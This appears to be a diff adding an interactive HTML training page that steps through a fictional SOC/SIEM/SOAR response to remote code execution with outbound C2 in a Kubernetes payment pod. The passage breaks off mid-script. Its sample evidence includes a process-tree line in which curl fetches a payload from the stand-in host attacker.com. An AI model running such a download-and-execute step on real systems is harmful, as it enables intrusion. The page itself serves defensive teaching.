@@ -1,0 +1,1170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Interactive SOC/SIEM/SOAR Workflow</title>
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+:root {
+  --bg: #0b1220;
+  --panel: #141c2e;
+  --panel-2: #1a2438;
+  --border: #2a3650;
+  --text: #e8edf5;
+  --muted: #8b9bb8;
+  --blue: #3b82f6;
+  --blue-dim: rgba(59,130,246,.15);
+  --purple: #a855f7;
+  --purple-dim: rgba(168,85,247,.15);
+  --orange: #f97316;
+  --orange-dim: rgba(249,115,22,.15);
+  --red: #ef4444;
+  --red-dim: rgba(239,68,68,.15);
+  --green: #22c55e;
+  --green-dim: rgba(34,197,94,.15);
+  --low: #64748b;
+  --medium: #eab308;
+  --high: #f97316;
+  --critical: #ef4444;
+}
+html { scroll-behavior: smooth; }
+body {
+  font-family: "Segoe UI", system-ui, -apple-system, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.5;
+  min-height: 100vh;
+}
+
+.page { max-width: 100%; margin: 0 auto; padding: 1.25rem 1rem 2rem; }
+
+/* Main layout — flow on top (L→R), details below */
+.main-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+  margin-bottom: 1rem;
+}
+
+/* Flow */
+.flow-panel {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1rem;
+}
+.flow-panel h2 { font-size: .85rem; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; margin-bottom: .85rem; }
+.flow-track {
+  display: flex; flex-direction: row; flex-wrap: nowrap; align-items: stretch;
+  gap: 0; overflow-x: auto; overflow-y: hidden;
+  padding: .35rem .25rem .75rem;
+  scroll-behavior: smooth;
+  scrollbar-width: thin; scrollbar-color: var(--border) transparent;
+}
+.flow-step {
+  flex: 0 0 auto;
+  width: 118px; min-height: 108px;
+  display: flex; flex-direction: column; align-items: center; text-align: center;
+  gap: .4rem; padding: .55rem .45rem; border-radius: 10px; cursor: pointer;
+  border: 1px solid transparent; background: var(--panel-2);
+  transition: border-color .15s, box-shadow .15s, transform .1s;
+}
+.flow-step:hover { border-color: var(--border); transform: translateY(-2px); }
+.flow-step.active {
+  border-color: #4f6b9a; box-shadow: 0 0 0 1px rgba(59,130,246,.25);
+  background: #1e2a42;
+}
+.flow-step.playing { animation: pulse 1s ease infinite; }
+@keyframes pulse {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(59,130,246,.35); }
+  50% { box-shadow: 0 0 0 4px rgba(59,130,246,.15); }
+}
+.step-num {
+  flex-shrink: 0; width: 1.75rem; height: 1.75rem; border-radius: 8px;
+  display: flex; align-items: center; justify-content: center;
+  font-size: .72rem; font-weight: 700;
+}
+.step-body { min-width: 0; width: 100%; }
+.step-title { font-size: .72rem; font-weight: 600; line-height: 1.25; }
+.step-cat { font-size: .62rem; color: var(--muted); margin-top: .2rem; line-height: 1.2; }
+.flow-arrow {
+  flex: 0 0 auto; align-self: center;
+  color: var(--muted); font-size: .85rem; line-height: 1;
+  padding: 0 .15rem; user-select: none;
+}
+.cat-collection .step-num, .cat-siem .step-num { background: var(--blue-dim); color: var(--blue); }
+.cat-soar .step-num { background: var(--purple-dim); color: var(--purple); }
+.cat-investigation .step-num { background: var(--orange-dim); color: var(--orange); }
+.cat-response .step-num { background: var(--red-dim); color: var(--red); }
+.cat-recovery .step-num { background: var(--green-dim); color: var(--green); }
+
+/* Header */
+.topbar {
+  background: linear-gradient(180deg, var(--panel) 0%, var(--bg) 100%);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 1.25rem 1.5rem;
+  margin-bottom: 1rem;
+}
+.topbar h1 { font-size: clamp(1.2rem, 2.5vw, 1.65rem); font-weight: 650; letter-spacing: -.02em; }
+.topbar p { color: var(--muted); font-size: .92rem; margin-top: .35rem; }
+.topbar-links { margin-top: .65rem; display: flex; flex-wrap: wrap; gap: .5rem; }
+.topbar-links a {
+  font-size: .78rem; font-weight: 600; color: var(--orange); text-decoration: none;
+  padding: .35rem .65rem; border-radius: 6px; border: 1px solid rgba(249,115,22,.35);
+  background: rgba(249,115,22,.08); transition: background .15s;
+}
+.topbar-links a:hover { background: rgba(249,115,22,.18); }
+
+/* Controls */
+.controls {
+  display: flex; flex-wrap: wrap; gap: .75rem; align-items: center;
+  margin-bottom: 1rem; padding: .85rem 1rem;
+  background: var(--panel); border: 1px solid var(--border); border-radius: 10px;
+}
+.btn {
+  border: 1px solid var(--border); background: var(--panel-2); color: var(--text);
+  padding: .45rem .9rem; border-radius: 8px; font-size: .85rem; cursor: pointer;
+  transition: background .15s, border-color .15s;
+}
+.btn:hover { background: #243049; border-color: #3d4f6f; }
+.btn-primary { background: var(--blue); border-color: var(--blue); color: #fff; }
+.btn-primary:hover { background: #2563eb; }
+.toggle-wrap {
+  display: flex; align-items: center; gap: .5rem; margin-left: auto;
+  font-size: .85rem; color: var(--muted);
+}
+.toggle-wrap input { width: 1rem; height: 1rem; accent-color: var(--purple); }
+
+.status-row {
+  display: flex; flex-wrap: wrap; gap: 1rem; align-items: center;
+  margin-bottom: 1rem;
+}
+.badge {
+  display: inline-flex; align-items: center; gap: .4rem;
+  padding: .35rem .75rem; border-radius: 999px; font-size: .78rem; font-weight: 600;
+  border: 1px solid var(--border); background: var(--panel);
+}
+.badge-dot { width: .55rem; height: .55rem; border-radius: 50%; }
+.sev-low { color: var(--low); } .sev-low .badge-dot { background: var(--low); }
+.sev-medium { color: var(--medium); } .sev-medium .badge-dot { background: var(--medium); }
+.sev-high { color: var(--high); } .sev-high .badge-dot { background: var(--high); }
+.sev-critical { color: var(--critical); } .sev-critical .badge-dot { background: var(--critical); }
+
+.risk-meter { flex: 1; min-width: 200px; max-width: 320px; }
+.risk-meter label { font-size: .75rem; color: var(--muted); display: block; margin-bottom: .25rem; }
+.risk-track {
+  height: 10px; background: var(--panel-2); border-radius: 999px; overflow: hidden;
+  border: 1px solid var(--border);
+}
+.risk-fill {
+  height: 100%; width: 0%; border-radius: 999px;
+  background: linear-gradient(90deg, var(--green), var(--medium), var(--orange), var(--red));
+  transition: width .4s ease;
+}
+.risk-value { font-size: .8rem; margin-top: .2rem; color: var(--muted); }
+
+/* Details panel */
+.details-panel {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1rem 1.1rem;
+  max-height: 420px; overflow-y: auto;
+}
+.details-panel h2 { font-size: 1.05rem; margin-bottom: .5rem; }
+.details-panel .meta { font-size: .78rem; color: var(--muted); margin-bottom: .85rem; }
+.detail-section { margin-bottom: .85rem; }
+.detail-section h3 {
+  font-size: .72rem; text-transform: uppercase; letter-spacing: .05em;
+  color: var(--muted); margin-bottom: .35rem;
+}
+.detail-section ul { padding-left: 1.1rem; font-size: .84rem; }
+.detail-section ul li { margin-bottom: .2rem; }
+.detail-section p, .detail-section pre {
+  font-size: .84rem; background: var(--panel-2); border: 1px solid var(--border);
+  border-radius: 8px; padding: .55rem .65rem; white-space: pre-wrap;
+}
+.tool-tags { display: flex; flex-wrap: wrap; gap: .35rem; }
+.tool-tag {
+  font-size: .72rem; padding: .2rem .5rem; border-radius: 6px;
+  background: var(--panel-2); border: 1px solid var(--border); color: var(--muted);
+}
+
+/* Legend */
+.legend {
+  display: flex; flex-wrap: wrap; gap: .75rem 1.25rem;
+  padding: .75rem 1rem; background: var(--panel); border: 1px solid var(--border);
+  border-radius: 10px; margin-bottom: 1rem; font-size: .78rem;
+}
+.legend-item { display: flex; align-items: center; gap: .4rem; color: var(--muted); }
+.legend-swatch { width: .85rem; height: .85rem; border-radius: 3px; }
+
+/* Timeline */
+.timeline-panel {
+  background: var(--panel); border: 1px solid var(--border);
+  border-radius: 12px; padding: 1rem; margin-bottom: 1rem;
+}
+.timeline-panel h2 { font-size: .85rem; color: var(--muted); text-transform: uppercase; letter-spacing: .06em; margin-bottom: .75rem; }
+.timeline {
+  display: flex; gap: .5rem; overflow-x: auto; padding-bottom: .35rem;
+}
+.tl-item {
+  flex: 0 0 auto; min-width: 140px; max-width: 180px;
+  padding: .55rem .65rem; border-radius: 8px; border: 1px solid var(--border);
+  background: var(--panel-2); font-size: .75rem; opacity: .45;
+  transition: opacity .25s, border-color .25s;
+}
+.tl-item.active { opacity: 1; border-color: var(--blue); }
+.tl-time { color: var(--blue); font-weight: 600; font-size: .7rem; margin-bottom: .2rem; }
+.tl-text { color: var(--text); line-height: 1.35; }
+
+/* Summary card */
+.summary-card {
+  display: none; background: linear-gradient(135deg, #1a2438 0%, #141c2e 100%);
+  border: 1px solid var(--red); border-radius: 12px; padding: 1.25rem;
+  box-shadow: 0 8px 32px rgba(239,68,68,.12);
+}
+.summary-card.visible { display: block; }
+.summary-card h2 { font-size: 1.1rem; margin-bottom: .75rem; color: #fca5a5; }
+.summary-grid {
+  display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  gap: .75rem; font-size: .84rem;
+}
+.summary-block {
+  background: rgba(0,0,0,.2); border: 1px solid var(--border);
+  border-radius: 8px; padding: .65rem .75rem;
+}
+.summary-block h3 { font-size: .72rem; text-transform: uppercase; color: var(--muted); margin-bottom: .35rem; }
+.summary-block ul { padding-left: 1rem; }
+.summary-block li { margin-bottom: .15rem; }
+
+/* ── AI Security Copilot (Steps 6 & 7) ── */
+.details-panel.details-panel--copilot { max-height: none; }
+.ai-expand {
+  margin-top: 1rem; border-top: 1px solid var(--border); padding-top: .85rem;
+}
+.ai-expand-toggle {
+  width: 100%; display: flex; align-items: center; justify-content: space-between;
+  gap: .5rem; padding: .55rem .75rem; border-radius: 8px; cursor: pointer;
+  border: 1px solid var(--border); background: var(--panel-2); color: var(--text);
+  font-size: .82rem; font-weight: 600; text-align: left;
+}
+.ai-expand-toggle:hover { border-color: var(--purple); }
+.ai-expand-toggle .chev { transition: transform .2s; color: var(--muted); }
+.ai-expand.open .ai-expand-toggle .chev { transform: rotate(180deg); }
+.ai-expand-body {
+  display: none; margin-top: .75rem; animation: fadeSlideIn .35s ease;
+}
+.ai-expand.open .ai-expand-body { display: block; }
+@keyframes fadeSlideIn {
+  from { opacity: 0; transform: translateY(6px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+.ai-badge {
+  display: inline-flex; align-items: center; gap: .35rem;
+  padding: .25rem .55rem; border-radius: 999px; font-size: .68rem; font-weight: 700;
+  background: linear-gradient(90deg, var(--purple-dim), rgba(59,130,246,.2));
+  border: 1px solid rgba(168,85,247,.45); color: #d8b4fe;
+  animation: badgeGlow 2.5s ease-in-out infinite;
+}
+@keyframes badgeGlow {
+  0%, 100% { box-shadow: 0 0 0 0 rgba(168,85,247,.25); }
+  50% { box-shadow: 0 0 12px 2px rgba(168,85,247,.2); }
+}
+.ai-banner {
+  margin-top: .85rem; padding: .65rem .75rem; border-radius: 8px; font-size: .78rem;
+  background: rgba(59,130,246,.08); border: 1px solid rgba(59,130,246,.25); color: var(--muted);
+}
+.ai-copilot-grid {
+  display: grid; grid-template-columns: 1fr 1fr; gap: .75rem;
+}
+@media (max-width: 720px) { .ai-copilot-grid { grid-template-columns: 1fr; } }
+.ai-card {
+  background: var(--panel-2); border: 1px solid var(--border);
+  border-radius: 10px; padding: .75rem;
+}
+.ai-card h4 {
+  font-size: .72rem; text-transform: uppercase; letter-spacing: .05em;
+  color: var(--muted); margin-bottom: .5rem;
+}
+.ai-card.ai-card--ai { border-color: rgba(168,85,247,.35); }
+.ai-kv { font-size: .8rem; margin-bottom: .35rem; }
+.ai-kv strong { color: var(--text); font-weight: 600; }
+.ai-kv span { color: var(--muted); }
+.ai-narrative {
+  font-size: .82rem; line-height: 1.55; color: var(--text);
+  padding: .55rem; background: rgba(168,85,247,.06); border-radius: 8px;
+  border-left: 3px solid var(--purple);
+}
+.ai-metrics { display: flex; flex-wrap: wrap; gap: .5rem; margin-top: .65rem; }
+.ai-metric {
+  flex: 1; min-width: 100px; padding: .45rem .55rem; border-radius: 8px;
+  background: rgba(0,0,0,.15); border: 1px solid var(--border); font-size: .72rem;
+}
+.ai-metric strong { display: block; font-size: .95rem; margin-top: .15rem; }
+.ai-metric.confidence strong { color: #a78bfa; }
+.ai-metric.prod strong { color: var(--orange); }
+.ai-metric.threat strong { color: var(--red); }
+
+/* Investigation flow diagram */
+.inv-flow {
+  display: flex; flex-direction: column; align-items: center; gap: .25rem;
+  padding: .65rem; background: rgba(0,0,0,.12); border-radius: 8px; margin-bottom: .75rem;
+  font-size: .72rem;
+}
+.inv-flow-row { display: flex; flex-wrap: wrap; justify-content: center; gap: .35rem; }
+.inv-node {
+  padding: .3rem .5rem; border-radius: 6px; border: 1px solid var(--border);
+  background: var(--panel); white-space: nowrap;
+}
+.inv-node.alert { border-color: var(--red); color: #fca5a5; }
+.inv-node.agent { border-color: var(--purple); color: #d8b4fe; font-weight: 600; }
+.inv-node.source { border-color: var(--blue); color: #93c5fd; font-size: .68rem; }
+.inv-node.stage { border-color: var(--orange); color: #fdba74; font-weight: 600; }
+.inv-arrow { color: var(--muted); line-height: 1; }
+
+/* Investigation timeline */
+.inv-timeline { position: relative; padding-left: 1.1rem; margin: .75rem 0; }
+.inv-timeline::before {
+  content: ""; position: absolute; left: .35rem; top: .25rem; bottom: .25rem;
+  width: 2px; background: var(--border);
+}
+.inv-tl-item {
+  position: relative; padding: .35rem 0 .35rem .65rem; font-size: .78rem;
+  opacity: 0; transform: translateX(-8px);
+  transition: opacity .4s ease, transform .4s ease;
+}
+.inv-tl-item.visible { opacity: 1; transform: translateX(0); }
+.inv-tl-item::before {
+  content: ""; position: absolute; left: -.82rem; top: .55rem;
+  width: 8px; height: 8px; border-radius: 50%; background: var(--border);
+  border: 2px solid var(--panel-2); transition: background .3s, box-shadow .3s;
+}
+.inv-tl-item.visible::before { background: var(--purple); box-shadow: 0 0 8px rgba(168,85,247,.5); }
+.inv-tl-time { font-weight: 600; color: var(--purple); font-size: .7rem; }
+.inv-tl-text { color: var(--muted); font-size: .75rem; }
+
+.ai-finding {
+  display: flex; gap: .45rem; align-items: flex-start; font-size: .78rem;
+  padding: .4rem 0; border-bottom: 1px solid var(--border);
+}
+.ai-finding:last-child { border-bottom: none; }
+.ai-finding .check { color: var(--green); flex-shrink: 0; font-weight: 700; }
+
+.ai-hypothesis {
+  margin-top: .65rem; padding: .65rem .75rem; border-radius: 8px;
+  background: rgba(239,68,68,.06); border: 1px solid rgba(239,68,68,.25);
+  font-size: .82rem; line-height: 1.5;
+}
+.ai-hypothesis .conf { margin-top: .4rem; font-size: .75rem; color: #fca5a5; font-weight: 600; }
+
+.ai-actions ol { padding-left: 1.2rem; font-size: .8rem; }
+.ai-actions li { margin-bottom: .25rem; }
+
+.ai-compare {
+  display: grid; grid-template-columns: 1fr 1fr; gap: .65rem; margin-top: .65rem;
+}
+@media (max-width: 560px) { .ai-compare { grid-template-columns: 1fr; } }
+.ai-compare-col {
+  padding: .65rem; border-radius: 8px; border: 1px solid var(--border);
+  background: rgba(0,0,0,.12); font-size: .78rem;
+}
+.ai-compare-col h5 { font-size: .68rem; text-transform: uppercase; color: var(--muted); margin-bottom: .45rem; }
+.ai-compare-col.ai { border-color: rgba(168,85,247,.35); }
+.ai-stat { margin-bottom: .3rem; }
+.ai-stat strong { color: var(--text); }
+</style>
+</head>
+<body>
+<div class="page">
+  <header class="topbar">
+    <h1>Interactive SOC/SIEM/SOAR Workflow</h1>
+    <p>From log ingestion to automated investigation and response — Remote Code Execution in Kubernetes with outbound C2</p>
+    <div class="topbar-links">
+      <a href="supply-chain-provenance-soar.html">Supply chain provenance deep dive (Steps 6 &amp; 7) →</a>
+    </div>
+  </header>
+
+  <div class="controls">
+    <button type="button" class="btn btn-primary" id="btnPlay">▶ Play Flow</button>
+    <button type="button" class="btn" id="btnReset">↺ Reset</button>
+    <label class="toggle-wrap">
+      <input type="checkbox" id="autoResponse" checked>
+      Auto Response Mode
+    </label>
+  </div>
+
+  <div class="status-row">
+    <div class="badge sev-low" id="severityBadge">
+      <span class="badge-dot"></span>
+      <span id="severityText">Severity: Low</span>
+    </div>
+    <div class="risk-meter">
+      <label>Risk Score</label>
+      <div class="risk-track"><div class="risk-fill" id="riskFill"></div></div>
+      <div class="risk-value"><span id="riskValue">0</span> / 100</div>
+    </div>
+  </div>
+
+  <div class="legend">
+    <span style="color:var(--muted);font-weight:600;">Legend:</span>
+    <span class="legend-item"><span class="legend-swatch" style="background:var(--blue)"></span> SIEM / Log Collection</span>
+    <span class="legend-item"><span class="legend-swatch" style="background:var(--purple)"></span> SOAR Orchestration</span>
+    <span class="legend-item"><span class="legend-swatch" style="background:var(--orange)"></span> Investigation</span>
+    <span class="legend-item"><span class="legend-swatch" style="background:var(--red)"></span> Critical Response</span>
+    <span class="legend-item"><span class="legend-swatch" style="background:var(--green)"></span> Recovery / Reporting</span>
+    <span class="legend-item">🔍 Detection Tool</span>
+    <span class="legend-item">👤 Human Approval (when Auto Response off)</span>
+  </div>
+
+  <div class="main-grid">
+    <section class="flow-panel">
+      <h2>Workflow — left to right</h2>
+      <div class="flow-track" id="flowTrack"></div>
+    </section>
+    <aside class="details-panel" id="detailsPanel">
+      <h2>Select a step</h2>
+      <p class="meta">Click a workflow step or press Play Flow to explore the incident lifecycle.</p>
+    </aside>
+  </div>
+
+  <section class="timeline-panel">
+    <h2>Incident Timeline</h2>
+    <div class="timeline" id="timeline"></div>
+  </section>
+
+  <section class="summary-card" id="summaryCard">
+    <h2>✓ Incident Summary — Flow Complete</h2>
+    <div class="summary-grid">
+      <div class="summary-block">
+        <h3>Incident</h3>
+        <p>Remote Code Execution with outbound C2 connection</p>
+        <p style="margin-top:.35rem;"><strong>Severity:</strong> Critical &nbsp;|&nbsp; <strong>Risk Score:</strong> 95</p>
+      </div>
+      <div class="summary-block">
+        <h3>Affected Workload</h3>
+        <p><strong>Pod:</strong> payment-api-prod<br><strong>Namespace:</strong> payments<br><strong>Owner:</strong> Payments Team</p>
+      </div>
+      <div class="summary-block">
+        <h3>Key Evidence</h3>
+        <ul>
+          <li>bash spawned by java process</li>
+          <li>curl downloaded external payload</li>
+          <li>Destination is known malware C2 (attacker.com)</li>
+          <li>Secrets accessed: database-password</li>
+          <li>50,000 customer records queried</li>
+        </ul>
+      </div>
+      <div class="summary-block">
+        <h3>Response</h3>
+        <ul id="summaryResponse"></ul>
+      </div>
+    </div>
+  </section>
+</div>
+
+<script>
+const TIMELINE = [
+  { time: "T+0s", text: "Runtime tool: bash spawned by java in payment-api pod" },
+  { time: "T+2s", text: "Network telemetry: outbound connection to attacker.com" },
+  { time: "T+15s", text: "Logs ingested into SIEM via collectors" },
+  { time: "T+45s", text: "SIEM correlates process + network events" },
+  { time: "T+1m", text: "Critical alert: Possible RCE with outbound C2" },
+  { time: "T+1m 10s", text: "SOAR playbook triggered for K8s RCE" },
+  { time: "T+2m", text: "Enrichment: pod, namespace, image, owner resolved" },
+  { time: "T+4m", text: "Investigation confirms C2 + secrets access" },
+  { time: "T+5m", text: "Risk score 95 — Critical decision" },
+  { time: "T+6m", text: "Containment actions executed" },
+  { time: "T+8m", text: "Evidence preserved; P1 ticket opened" },
+  { time: "T+1d", text: "Remediation tasks assigned" },
+  { time: "T+1w", text: "Lessons learned report published" }
+];
+
+const WORKFLOW_STEPS = [
+  {
+    id: 1,
+    title: "Log Sources",
+    category: "collection",
+    categoryLabel: "Detection",
+    severity: "Low",
+    riskScore: 10,
+    purpose: "Generate raw telemetry from systems across the environment.",
+    inputs: [
+      "Kubernetes audit logs",
+      "Runtime security alerts",
+      "API gateway logs",
+      "Firewall logs",
+      "CloudTrail or cloud activity logs",
+      "CI/CD logs",
+      "GitHub audit logs"
+    ],
+    actions: ["Systems produce raw security events and telemetry"],
+    outputs: ["Raw security telemetry"],
+    example: "payment-api pod executed unusual child process: /bin/bash spawned by java",
+    tools: ["Falco", "Sysdig", "AWS CloudTrail", "GitHub Audit Log", "Kube Audit"]
+  },
+  {
+    id: 2,
+    title: "Log Ingestion",
+    category: "collection",
+    categoryLabel: "Log Collection",
+    severity: "Low",
+    riskScore: 12,
+    purpose: "Collect and forward logs into the SIEM pipeline.",
+    inputs: ["Raw logs from agents, collectors, APIs, and webhooks"],
+    actions: [
+      "Collect logs from endpoints and cloud sources",
+      "Parse timestamps and normalize headers",
+      "Tag source systems and environments",
+      "Forward events to SIEM indexers"
+    ],
+    outputs: ["Searchable security events in SIEM"],
+    example: "Fluent Bit forwards runtime alert + VPC flow log to Splunk HEC within 3 seconds",
+    tools: ["Fluent Bit", "Logstash", "Splunk Forwarder", "OpenTelemetry Collector"]
+  },
+  {
+    id: 3,
+    title: "SIEM Normalization and Correlation",
+    category: "siem",
+    categoryLabel: "SIEM",
+    severity: "Medium",
+    riskScore: 35,
+    purpose: "Normalize events and correlate signals across multiple data sources.",
+    inputs: [
+      "Runtime event: bash spawned by java in payment-api-prod",
+      "Network event: outbound connection to attacker.com from same pod IP"
+    ],
+    actions: [
+      "Normalize fields (process, user, pod, src_ip, dest_ip)",
+      "Time-window correlation across runtime and network telemetry",
+      "Match detection rule: RCE_WITH_OUTBOUND_C2"
+    ],
+    outputs: ["Correlated security finding linking process execution to external C2"],
+    example: "Correlation ID CORR-88421: java → bash within 2s of TCP/443 to attacker.com",
+    tools: ["Splunk", "Microsoft Sentinel", "QRadar", "Google Security Operations"]
+  },
+  {
+    id: 4,
+    title: "Alert Generation",
+    category: "siem",
+    categoryLabel: "SIEM",
+    severity: "High",
+    riskScore: 55,
+    purpose: "Create a formal security alert from the correlated finding.",
+    inputs: ["Correlated detection rule match with supporting evidence"],
+    actions: [
+      "Assign severity based on rule and asset criticality",
+      "Attach raw evidence (events, timestamps, entities)",
+      "Trigger alert and notify on-call channel"
+    ],
+    outputs: ["Alert: Possible RCE with outbound connection — Severity High"],
+    example: "ALERT-2026-0412: Possible RCE with outbound connection | Entity: payment-api-prod",
+    tools: ["Splunk ES", "Sentinel Analytics", "Chronicle Rules"]
+  },
+  {
+    id: 5,
+    title: "SOAR Trigger",
+    category: "soar",
+    categoryLabel: "SOAR",
+    severity: "High",
+    riskScore: 58,
+    purpose: "Start the automated response playbook for this alert type.",
+    inputs: ["SIEM alert ALERT-2026-0412 with entity context"],
+    actions: [
+      "Select playbook: K8s_RCE_Outbound_C2",
+      "Create case context and incident ID",
+      "Start automated workflow orchestration"
+    ],
+    outputs: ["SOAR case CASE-99102 initialized"],
+    example: "Playbook K8s_RCE_Outbound_C2 v3.2 started for alert ALERT-2026-0412",
+    tools: ["Splunk SOAR", "Cortex XSOAR", "Microsoft Sentinel Logic Apps", "Tines"]
+  },
+  {
+    id: 6,
+    title: "SOAR Enrichment",
+    category: "soar",
+    categoryLabel: "SOAR",
+    severity: "High",
+    riskScore: 62,
+    purpose: "Add operational and business context to the alert.",
+    inputs: ["Pod name", "Namespace", "Source IP", "Destination IP", "Image digest"],
+    actions: [
+      "Query Kubernetes API for pod and deployment metadata",
+      "Query CMDB for service owner and tier",
+      "Query container registry for image digest and build pipeline",
+      "Query identity provider for service account bindings",
+      "Query ownership database for escalation contacts"
+    ],
+    outputs: ["Enriched alert context with asset and ownership data"],
+    example: "Pod: payment-api-prod | Namespace: payments | Owner: Payments Team\nImage: sha256:abc123 | Service account: payment-api-sa",
+    tools: ["Kubernetes API", "ServiceNow CMDB", "ECR/GCR", "Okta", "Internal ownership DB"]
+  },
+  {
+    id: 7,
+    title: "SOAR Investigation",
+    category: "investigation",
+    categoryLabel: "Investigation",
+    severity: "High",
+    riskScore: 78,
+    purpose: "Determine whether the alert represents a true incident and assess blast radius.",
+    inputs: ["Enriched alert with pod, network, and identity context"],
+    actions: [
+      "Analyze process tree: java → bash → curl",
+      "Check destination reputation for attacker.com",
+      "Review recent deployments and image changes",
+      "Check secrets access in last 24 hours",
+      "Check database access patterns",
+      "Search for related alerts on same namespace"
+    ],
+    outputs: ["Investigation findings confirming malicious activity"],
+    example: "Process tree: java → bash → curl attacker.com/payload.sh\nDestination: known malware C2 | Secrets: database-password accessed\nCustomer records queried: 50,000",
+    tools: ["VirusTotal", "Threat Intel Platform", "K8s audit logs", "Secrets Manager audit", "DB audit logs"]
+  },
+  {
+    id: 8,
+    title: "Risk Scoring and Decision Logic",
+    category: "investigation",
+    categoryLabel: "Investigation",
+    severity: "Critical",
+    riskScore: 95,
+    purpose: "Calculate incident severity and determine the appropriate response path.",
+    inputs: ["Investigation findings and policy rules"],
+    actions: [
+      "Shell spawned from app process: +25",
+      "Known C2 destination: +30",
+      "Secrets accessed: +20",
+      "Customer data queried at scale: +20",
+      "Apply policy: score ≥ 90 → Critical, auto-containment if enabled"
+    ],
+    outputs: ["Risk score 95 — Severity Critical — Containment recommended"],
+    example: "Total score: 95 | Severity: Critical | Decision: Execute containment playbook",
+    tools: ["SOAR decision engine", "Risk policy YAML", "MITRE ATT&CK mapping"]
+  },
+  {
+    id: 9,
+    title: "Response Actions",
+    category: "response",
+    categoryLabel: "Response",
+    severity: "Critical",
+    riskScore: 95,
+    purpose: "Contain the threat and limit further damage.",
+    inputs: ["Risk score 95", "Response policy", "Auto Response Mode setting"],
+    actionsAuto: [
+      "Block outbound destination at firewall/proxy",
+      "Apply Kubernetes NetworkPolicy denying egress",
+      "Quarantine pod (scale to zero / isolate node)",
+      "Revoke workload credentials and service account tokens",
+      "Disable token renewal for compromised identity"
+    ],
+    actionsManual: [
+      "Present recommended containment actions to analyst",
+      "Request human approval via SOC chat / ticket",
+      "Execute approved actions after sign-off",
+      "Document approver and timestamp"
+    ],
+    outputsAuto: ["Threat contained automatically — egress blocked, pod quarantined"],
+    outputsManual: ["Containment pending analyst approval — actions queued"],
+    exampleAuto: "Auto: egress to attacker.com blocked, pod payment-api-prod quarantined, SA token revoked",
+    exampleManual: "Analyst Jane Doe approved quarantine at 14:32 UTC after reviewing evidence",
+    tools: ["Kubernetes API", "Palo Alto FW", "Cloud WAF", "IAM / Vault", "SOAR action library"]
+  },
+  {
+    id: 10,
+    title: "Evidence Preservation",
+    category: "response",
+    categoryLabel: "Response",
+    severity: "Critical",
+    riskScore: 95,
+    purpose: "Preserve forensic evidence before or alongside destructive containment actions.",
+    inputs: ["Runtime data", "Container logs", "Network telemetry", "Kubernetes events"],
+    actions: [
+      "Capture full process tree snapshot",
+      "Save pod logs and previous container logs",
+      "Export Kubernetes events and audit trail",
+      "Record network connection table (5-tuple, timestamps)",
+      "Store evidence package in incident repository with hash chain"
+    ],
+    outputs: ["Evidence package EV-99102 attached to incident"],
+    example: "Evidence bundle: 847 MB — process tree, pod logs, flow logs, K8s audit — SHA256 verified",
+    tools: ["SOAR evidence module", "S3 evidence bucket", "Forensic capture agents"]
+  },
+  {
+    id: 11,
+    title: "Incident Ticket Creation",
+    category: "response",
+    categoryLabel: "Response",
+    severity: "Critical",
+    riskScore: 95,
+    purpose: "Open a formal incident record and notify stakeholders.",
+    inputs: ["Investigation summary", "Evidence package", "Recommended / executed actions"],
+    actions: [
+      "Create ServiceNow or Jira P1 incident ticket",
+      "Assign incident commander and application owner",
+      "Set priority P1 and SLA clocks",
+      "Notify SOC, IR team, Payments Team, and leadership"
+    ],
+    outputs: ["P1 incident INC-004521 created and assigned"],
+    example: "INC-004521 | P1 | RCE + C2 on payment-api-prod | Assigned: IR Lead + Payments on-call",
+    tools: ["ServiceNow", "Jira Service Management", "PagerDuty", "Slack / Teams"]
+  },
+  {
+    id: 12,
+    title: "Remediation Tracking",
+    category: "recovery",
+    categoryLabel: "Recovery",
+    severity: "High",
+    riskScore: 70,
+    purpose: "Ensure root cause is fixed and recurrence is prevented.",
+    inputs: ["Incident ticket", "Root cause findings from investigation"],
+    actions: [
+      "Create remediation tasks in ticketing system",
+      "Patch vulnerable application dependency",
+      "Rotate compromised secrets and database credentials",
+      "Review and restrict service account permissions",
+      "Validate container image provenance and rebuild from trusted base",
+      "Add detection rule improvements for similar TTPs"
+    ],
+    outputs: ["Remediation plan with owners and due dates"],
+    example: "Tasks: patch CVE-2026-xxxx, rotate DB creds, tighten SA RBAC, rebuild image from signed base",
+    tools: ["Jira", "ServiceNow", "GitHub Issues", "Vulnerability management platform"]
+  },
+  {
+    id: 13,
+    title: "Lessons Learned / Reporting",
+    category: "recovery",
+    categoryLabel: "Recovery",
+    severity: "Medium",
+    riskScore: 40,
+    purpose: "Improve future detection and response through structured post-incident review.",
+    inputs: ["Incident timeline", "Root cause analysis", "Response metrics (MTTD, MTTR)"],
+    actions: [
+      "Document lessons learned and control gaps",
+      "Update SIEM detection rules and correlation logic",
+      "Update SOAR playbook with new enrichment queries",
+      "Report mean time to detect (4m) and respond (6m) to leadership",
+      "Schedule purple-team validation of new controls"
+    ],
+    outputs: ["Final incident report published to GRC and security leadership"],
+    example: "Post-incident report: MTTD 4m, MTTR 6m, 3 detection gaps closed, playbook v3.3 deployed",
+    tools: ["Confluence", "GRC platform", "SIEM content management", "SOAR playbook editor"]
+  }
+];
+
+let activeStep = null;
+let playTimer = null;
+let playing = false;
+let copilotAnimTimer = null;
+
+const AI_ENRICHMENT = {
+  traditional: {
+    pod: "payment-api-prod",
+    namespace: "payments",
+    cluster: "prod-east",
+    serviceAccount: "payment-api-sa",
+    sourceIp: "10.42.18.44",
+    destIp: "198.51.100.77",
+    imageDigest: "sha256:abc123def456",
+    imageTag: "payment-api:v4.5",
+    deployedAt: "2026-06-07 07:12 UTC (~2 hours ago)",
+    repository: "github.com/acme/payment-api",
+    owner: "Payments Team"
+  },
